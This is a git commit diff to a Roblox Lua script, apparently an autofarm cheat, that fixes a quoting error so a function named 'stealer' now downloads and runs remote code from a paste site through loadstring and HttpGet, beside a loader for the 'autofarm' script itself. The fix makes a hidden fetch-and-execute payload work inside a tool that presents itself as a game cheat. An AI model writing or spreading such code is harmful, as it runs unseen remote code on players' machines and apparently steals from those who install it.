b2c1d9d118f7476ab13f46d271a805fc9dce56d8
leonix <furkan62.bakir@gmail.com>
2025-10-18 18:35:03 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet(''https://paste.debian.net/plainh/4ea1f6a5/', true))()
+    loadstring(game:HttpGet('https://paste.debian.net/plainh/4ea1f6a5/', true))()
 end
 local function loadui()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/autofarm-V1/refs/heads/main/autofarm'))()
